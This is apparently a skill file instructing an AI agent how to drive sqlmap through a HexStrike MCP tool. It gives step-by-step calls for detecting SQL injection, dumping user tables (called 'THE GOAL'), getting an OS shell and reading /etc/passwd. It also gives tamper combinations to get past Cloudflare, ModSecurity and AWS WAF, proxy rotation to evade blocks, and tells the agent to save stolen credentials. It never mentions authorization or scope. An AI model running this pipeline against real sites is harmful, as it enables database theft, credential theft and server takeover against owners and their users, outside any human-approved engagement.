---
name: "hexstrike-sqlmap"
description: "Correct parameters, flag combos, escalation pipeline, and WAF bypass strategies for HexStrike sqlmap_scan MCP tool."
---

# HexStrike sqlmap_scan — Tool Skill

Automated SQL injection detection AND exploitation. Tests URL parameters, POST data, cookies, and headers for injectable points. Can extract databases, dump tables, read files, and get OS shells.

---

## Accepted Parameters

| Parameter         | Type   | Required | Description                                                                                                 |
| ----------------- | ------ | -------- | ----------------------------------------------------------------------------------------------------------- |
| `target`          | string | **YES**  | URL with injectable parameter (e.g. `https://example.com/search?q=test`)                                    |
| `level`           | int    | no       | Injection depth 1-5. Higher = more tests, more params (cookies at 2, User-Agent at 3). Default: 1           |
| `risk`            | int    | no       | Payload aggressiveness 1-3. 3 = OR-based and heavy time-based. Default: 1                                   |
| `technique`       | string | no       | Injection techniques: `B`=Boolean, `E`=Error, `U`=Union, `S`=Stacked, `T`=Time, `Q`=Inline. Default: BEUSTQ |
| `additional_args` | string | no       | Extra flags as a single string                                                                              |

---

## Flag Combos by Phase

### Detection (is it injectable?)

```
sqlmap_scan(target="https://example.com/search?q=test", level=3, risk=2, additional_args="--batch")
```

### Confirmation (full technique coverage)

```
sqlmap_scan(target="https://example.com/search?q=test", level=5, risk=3, technique="BEUSTQ", additional_args="--batch")
```

### Database Enumeration

```
sqlmap_scan(target="https://example.com/search?q=test", additional_args="--batch --dbs")
sqlmap_scan(target="https://example.com/search?q=test", additional_args="--batch -D targetdb --tables")
sqlmap_scan(target="https://example.com/search?q=test", additional_args="--batch -D targetdb -T users --columns")
```

### Data Extraction (THE GOAL)

```
sqlmap_scan(target="https://example.com/search?q=test", level=5, risk=3, additional_args="--batch --dump -D targetdb -T users")
```

### Escalation — OS Shell

```
sqlmap_scan(target="https://example.com/search?q=test", additional_args="--batch --os-shell")
```

### Escalation — File Read

```
sqlmap_scan(target="https://example.com/search?q=test", additional_args="--batch --file-read=/etc/passwd")
```

### With Proxy

```
sqlmap_scan(target="https://example.com/search?q=test", level=5, risk=3, additional_args="--batch --dump --proxy=http://user:pass@host:port")
```

---

## Non-Interactive Execution

**Without `--batch`, sqlmap prompts interactively and HANGS forever.** Every sqlmap call MUST include `--batch` in `additional_args`.

---

## WAF Bypass — Tamper Scripts

If initial scan fails or gets blocked by WAF:

```
# Common WAF bypass combo
sqlmap_scan(target="URL", level=5, risk=3, additional_args="--batch --tamper=space2comment,between,randomcase")

# Aggressive bypass
sqlmap_scan(target="URL", level=5, risk=3, additional_args="--batch --tamper=space2comment,between,randomcase,charencode,equaltolike")

# Specific WAFs
# Cloudflare: --tamper=between,randomcase,space2comment
# ModSecurity: --tamper=space2comment,charencode,equaltolike
# AWS WAF: --tamper=between,percentage,randomcase
```

---

## Retry Strategy

1. **"parameter is not injectable"** → Try higher `level` (5) and `risk` (3). Try `technique="T"` (time-based only — slower but catches blind SQLi).
2. **Blocked by WAF** → Add `--tamper` scripts (see above). Try different HTTP method: `--method=POST`.
3. **Timeout** → Add `--timeout=30`. Try with proxy for IP rotation.
4. **Wrong parameter** → Verify the injectable parameter. Try `*` marker: `https://example.com/search?q=test*` to force-test that position.
5. **Still fails after 3 attempts** → Mark as "not injectable" and move on. Don't brute-force a non-vuln.

---

## Output Interpretation

- **"parameter 'X' is vulnerable"** → Confirmed SQLi. Proceed to extraction.
- **"X databases available"** → Enumerate tables, then dump.
- **Dumped rows with data** → Critical finding. Persist credentials to SQLite.
- **"parameter is not injectable"** → Not vulnerable. Move on.
- **"connection timed out"** → Network issue or WAF block. Retry with proxy/tamper.
- **"back-end DBMS: MySQL/PostgreSQL/etc."** → Note the DB type for exploit specificity.

---

## Evidence Capture

For every successful extraction:

1. Save the database/table/column structure
2. Save extracted rows (especially credential tables)
3. Note the injection point (URL, parameter, method)
4. Note the technique that worked (Boolean, Union, Time, etc.)
5. If `--os-shell` succeeds, capture `whoami`, `id`, `cat /etc/passwd`
